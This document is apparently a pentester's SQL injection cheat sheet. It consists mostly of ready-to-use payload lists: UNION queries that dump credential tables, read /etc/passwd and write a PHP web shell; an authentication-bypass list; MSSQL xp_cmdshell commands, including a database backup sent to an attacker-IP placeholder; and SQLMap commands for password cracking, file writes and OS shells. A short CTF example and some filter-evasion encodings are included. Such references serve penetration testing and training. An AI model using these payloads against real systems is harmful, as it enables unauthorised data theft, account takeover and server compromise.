# SQL Injection (SQLi)

## **Introduction**

> * SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
> * It generally allows an attacker to view data that they are not normally able to retrieve.
> * This might include data belonging to other users, or any other data that the application itself is able to access.
> * In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
> * In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.
> * Source: [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)

***

## **Useful Resources**

1. [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
2. [https://book.hacktricks.xyz/pentesting-web/sql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

***

## **Finding a SQLi attack vector**

> Whenever faced with user-input, you can check if the target is vulnerable to SQLi by using the following inputs Note that in some cases you may be facing a blind SQLi, which means that you won't be able to "see" any error messages

```
'
"
`
')
")
`)
'))
"))
`))
OR 1=1
OR 1=1 -- //
```

> Take care when injecting the condition OR 1=1 into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.

***

## SQL Injection Filter Evasion - Unicode Normalization

Unicode normalization is a process that ensures different binary representations of characters are standardized to the same binary value. This process is crucial in dealing with strings in programming and data processing

You can find a great article here:\
[https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)

Depending on how the back-end/front-end is behaving when it **receives weird unicode characters** an attacker might be able to **bypass protections and inject arbitrary characters.**

You can use the following payloads to try and trigger a SQLi whenever you are facing any filters. Sometimes, unicode normalization even allows bypassing WAFs in place.

Other characters can be found at:

* [https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html](https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html)
* [https://0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

| Character | Unicode Normalization |
| --------- | --------------------- |
| o         | %e1%b4%bc             |
| r         | %e1%b4%bf             |
| 1         | %c2%b9                |
| =         | %e2%81%bc             |
| /         | %ef%bc%8f             |
| -         | %ef%b9%a3             |
| #         | %ef%b9%9f             |
| \*        | %ef%b9%a1             |
| '         | %ef%bc%87             |
| "         | %ef%bc%82             |
| \|        | %ef%bd%9c             |

***

## **UNION-Based SQL Injection Payloads**

| Payload                                                                                                                                         | Description                                          |
| ----------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| ' order by 1-- -                                                                                                                                | Detect number of columns using order by              |
| cn' UNION select 1,2,3-- -                                                                                                                      | Detect number of columns using Union injection       |
| cn' UNION select 1,@@version,3,4-- -                                                                                                            | Basic Union injection                                |
| UNION select username, 2, 3, 4 from passwords-- -                                                                                               | Union injection for 4 columns                        |
| cn' UNION select 1,database(),2,3-- -                                                                                                           | Current database name                                |
| cn' UNION select 1,schema\_name,3,4 from INFORMATION\_SCHEMA.SCHEMATA-- -                                                                       | List all databases                                   |
| cn' UNION select 1,TABLE\_NAME,TABLE\_SCHEMA,4 from INFORMATION\_SCHEMA.TABLES where table\_schema='dev'-- -                                    | List all tables in a specific database               |
| cn' UNION select 1,COLUMN\_NAME,TABLE\_NAME,TABLE\_SCHEMA from INFORMATION\_SCHEMA.COLUMNS where table\_name='credentials'-- -                  | List all columns in a specific table                 |
| cn' UNION select 1, username, password, 4 from dev.credentials-- -                                                                              | Dump data from a table in another database           |
| cn' UNION SELECT 1, user(), 3, 4-- -                                                                                                            | Find current user                                    |
| cn' UNION SELECT 1, super\_priv, 3, 4 FROM mysql.user WHERE user="root"-- -                                                                     | Find if user has admin privileges                    |
| cn' UNION SELECT 1, grantee, privilege\_type, is\_grantable FROM information\_schema.user\_privileges WHERE user="root"-- -                     | Find if all user privileges                          |
| cn' UNION SELECT 1, variable\_name, variable\_value, 4 FROM information\_schema.global\_variables where variable\_name="secure\_file\_priv"-- - | Find which directories can be accessed through MySQL |
| cn' UNION SELECT 1, LOAD\_FILE("/etc/passwd"), 3, 4-- -                                                                                         | Read local file                                      |
| select 'file written successfully!' into outfile '/var/www/html/proof.txt'                                                                      | Write a string to a local file                       |
| cn' union select "",'', "", "" into outfile '/var/www/html/shell.php'-- -                                                                       | Write a web shell into the base web directory        |

***

## **SQL Injection Payloads Lists**

<details>

<summary>Authentication Bypass</summary>

```
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
' OR 1=1 -- //
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer 
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```



</details>

<details>

<summary>MSSQL Generic Payloads</summary>

```
; --
'; --
'); --
'; exec master..xp_cmdshell 'ping 10.10.1.2'--
' grant connect to name; grant resource to name; --
' or 1=1 -- 
' union (select @@version) --
' union (select NULL, (select @@version)) --
' union (select NULL, NULL, (select @@version)) --
' union (select NULL, NULL, NULL,  (select @@version)) --
' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --
'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --
'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --
'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
select @@version
select @@servernamee
select @@microsoftversione
select * from master..sysserverse
select * from sysusers
exec master..xp_cmdshell 'ipconfig+/all'	
exec master..xp_cmdshell 'net+view'
exec master..xp_cmdshell 'net+users'
exec master..xp_cmdshell 'ping+<attackerip>'
BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'" select * from myfile"--
```

</details>

***

## **SQLMap Basics**

| Command                                                                                                                  | Description                                                 |
| ------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------- |
| sqlmap -h                                                                                                                | View the basic help menu                                    |
| sqlmap -hh                                                                                                               | View the advanced help menu                                 |
| sqlmap -u "http://www.example.com/vuln.php?id=1" --batch                                                                 | Run SQLMap without asking for user input                    |
| sqlmap 'http://www.example.com/' --data 'uid=1\&name=test'                                                               | SQLMap with POST request                                    |
| sqlmap 'http://www.example.com/' --data 'uid=1\*\&name=test'                                                             | POST request specifying an injection point with an asterisk |
| sqlmap -r req.txt                                                                                                        | Passing an HTTP request file to SQLMap                      |
| sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'                                                         | Specifying a cookie header                                  |
| sqlmap -u www.target.com --data='id=1' --method PUT                                                                      | Specifying a PUT request                                    |
| sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt                                              | Store traffic to an output file                             |
| sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch                                                             | Specify verbosity level                                     |
| sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"                                                      | Specifying a prefix or suffix                               |
| sqlmap -u www.example.com/?id=1 -v 3 --level=5                                                                           | Specifying the level and risk                               |
| sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba                                   | Basic DB enumeration                                        |
| sqlmap -u "http://www.example.com/?id=1" --tables -D testdb                                                              | Table enumeration                                           |
| sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname                                       | Table/row enumeration                                       |
| sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"                              | Conditional enumeration                                     |
| sqlmap -u "http://www.example.com/?id=1" --schema                                                                        | Database schema enumeration                                 |
| sqlmap -u "http://www.example.com/?id=1" --search -T user                                                                | Searching for data                                          |
| sqlmap -u "http://www.example.com/?id=1" --passwords --batch                                                             | Password enumeration and cracking                           |
| sqlmap -u "http://www.example.com/" --data="id=1\&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token" | Anti-CSRF token bypass                                      |
| sqlmap --list-tampers                                                                                                    | List all tamper scripts                                     |
| sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba                                                               | Check for DBA privileges                                    |
| sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"                                                       | Reading a local file                                        |
| sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"                  | Writing a file                                              |
| sqlmap -u "http://www.example.com/?id=1" --os-shell                                                                      | Spawning an OS shell                                        |

***

## **Second Order SQLi**

> Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way

One example of second order SQLi is the following i faced during a CTF challenge:

1. The target web application's registration form suffered from SQLi
2. After registering a user, a specific field inside the user profile showed the result of the SQL injection
3. To achieve a second-order SQLi with sqlmap i used the following:
   * `sqlmap -r req --batch --dump --risk 3 --level 5 --second-req req2 --dbms=mysql --tamper=space2comment --dump`

***

## **NoSQL Injection**

> * NoSQL databases provide looser consistency restrictions than traditional SQL databases.
> * By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits.
> * Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.

**Useful External Resources:**

1. [https://gitlab.com/pentest-tools/PayloadsAllTheThings/-/tree/master/NoSQL%20Injection](https://gitlab.com/pentest-tools/PayloadsAllTheThings/-/tree/master/NoSQL%20Injection)
2. [https://nullsweep.com/nosql-injection-cheatsheet/](https://nullsweep.com/nosql-injection-cheatsheet/)
3. [https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/nosql/](https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/nosql/)
4. [https://book.hacktricks.xyz/pentesting-web/nosql-injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
